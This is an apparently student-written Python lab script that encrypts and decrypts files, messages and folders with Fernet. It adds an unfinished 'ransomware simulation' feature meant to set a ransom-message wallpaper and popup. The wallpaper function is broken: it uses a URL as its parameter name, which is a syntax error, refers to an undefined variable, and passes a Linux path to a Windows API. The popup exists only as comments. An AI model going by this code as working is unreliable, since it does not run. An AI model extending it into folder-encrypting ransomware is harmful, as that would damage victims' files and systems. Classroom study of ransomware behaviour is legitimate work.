#!/usr/bin/env python3
import os, urllib.request, ctypes
from cryptography.fernet import Fernet


# Script Name:                  File Encryption Script Part 3 of 3
# Author:                       NATASHA SIRAMARCO
# Date of latest revision:      07/20/2023
# Purpose:                      Add a feature capability to your Python encryption tool to:
#                               
#                               Alter the desktop wallpaper on a Windows PC with a ransomware message
#                               Create a popup window on a Windows PC with a ransomware message
#                               Make this feature optional. In the user menu prompt, add this as a ransomware simulation option.



# Declaration of functions
# Developed with class review assistance
# Key generation
def generate_key():
    return Fernet.generate_key()
# Load Key and return as bytes
def load_key(key_file):
    with open(key_file, 'rb') as file:
        return file.read()
# Save the Key into a file
def save_key(key_file, key):
    with open(key_file, 'wb') as file:
        file.write(key)
# Encrypt file with fernet key
def encrypt_file(key, input_file, output_file):
    fernet = Fernet(key)
    # Read input content & encrypt
    with open(input_file, 'rb') as file:
        data = file.read()
    encrypted_data = fernet.encrypt(data)
    # Write encrypted data into output file
    with open(output_file, 'wb') as file:
        file.write(encrypted_data)
# Decryt data with fernet key
def decrypt_file(key, input_file, output_file):
    fernet = Fernet(key)
    # Read input conent and decrypt
    with open(input_file, 'rb') as file:
        data = file.read()
    decrypted_data = fernet.decrypt(data)
    # Writes decrypt data into output file
    with open(output_file, 'wb') as file:
        file.write(decrypted_data)
# Convert message into bytes, encrypt with fernet key
def encrypt_message(key, message):
    fernet = Fernet(key)
    encrypted_message = fernet.encrypt(message.encode())
    #print encrypted message as a string
    print("Encrypted message:", encrypted_message.decode())
# Fernet key and encrypted message 
def decrypt_message(key, encrypted_message):
    fernet = Fernet(key)
    decrypted_message = fernet.decrypt(encrypted_message.encode())
    #print decrypted message as a string
    print("Decrypted message:", decrypted_message.decode())


# Recursive folder and contents and key to encrypt
def encrypt_folder(key, input_folder, output_folder):
    for dirpath, dirnames, filenames in os.walk(input_folder):
        for filename in filenames:
            input_file = os.path.join(dirpath, filename)
            relative_path = os.path.relpath(input_file, input_folder)
            output_file = os.path.join(output_folder, relative_path)
            encrypt_file(key, input_file, output_file)
# Recursive folder and contents and key to decrypt
def decrypt_folder(key, input_folder, output_folder):
    for dirpath, dirnames, filenames in os.walk(input_folder):
        for filename in filenames:
            input_file = os.path.join(dirpath, filename)
            relative_path = os.path.relpath(input_file, input_folder)
            output_file = os.path.join(output_folder, relative_path)
            decrypt_file(key, input_file, output_file)




# Alter desktop wallpaper with ransomeware 
def desktop_wallpaper(https://www.secpod.com/blog/wp-content/uploads/2017/05/Screenshot-from-2017-05-14-23-42-20.png):
    # Download image and save it to the desktop folder
    path = '/home/ns/CodeFellows-Ops-401d-Labs-2'
    urllib.request.urlretrieve(image_url, path)

    # Change the desktop wallpaper using Windows API
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


# popup window with ransomware message
# Menu prompt, add this as a ransomware simulation option.




# Main
# Check if encryption key exists
def main():
    key_file = 'encryption_key.key'
    if not os.path.exists(key_file):
        key = generate_key()
        save_key(key_file, key)
    #Generate new fernet key
    else:
        key = load_key(key_file)

# Menu
    print("Select a mode:")
    print("1 - Encrypt file")
    print("2 - Decrypt file")
    print("3 - Encrypt message")
    print("4 - Decrypt message")
    print("5 - Recursively encrypt folder and its contents")
    print("6 - Recursively decrypt folder that was encrypted by this tool")

    mode = int(input("Enter mode: "))

    if mode == 1:
        encrypt_file(key, input("Enter filepath of file to encrypt: "), input("Enter filepath to save encrypted file: "))
        print("File encrypted successfully.")

    elif mode == 2:
        decrypt_file(key, input("Enter filepath of file to decrypt: "), input("Enter filepath to save decrypted file: "))
        print("File decrypted successfully.")

    elif mode == 3:
        encrypt_message(key, input("Enter message to encrypt: "))

    elif mode == 4:
        decrypt_message(key, input("Enter message to decrypt: "))

    elif mode == 5:
        input_folder = input("Enter folder path to encrypt: ")
        output_folder = input("Enter folder path to save encrypted files: ")
        encrypt_folder(key, input_folder, output_folder)
        print("Folder encrypted successfully.")

    elif mode == 6:
        input_folder = input("Enter folder path to decrypt: ")
        output_folder = input("Enter folder path to save decrypted files: ")
        decrypt_folder(key, input_folder, output_folder)
        print("Folder decrypted successfully.")

    else:
        print("Invalid mode selection. Please try again..")

# Execute script main/menu selection
if __name__ == "__main__":
    main()


# End


# References
# [Dialog Boxes with Python](https://www.devdungeon.com/content/dialog-boxes-python)
# [Example Python-based Ransomware](https://github.com/ncorbuk/Python-Ransomware/blob/master/RansomWare.py)
# [Example Ransomware popup and wallpaper](https://www.secpod.com/blog/wp-content/uploads/2017/05/Screenshot-from-2017-05-14-23-42-20.png)

# ChatGPT Assisted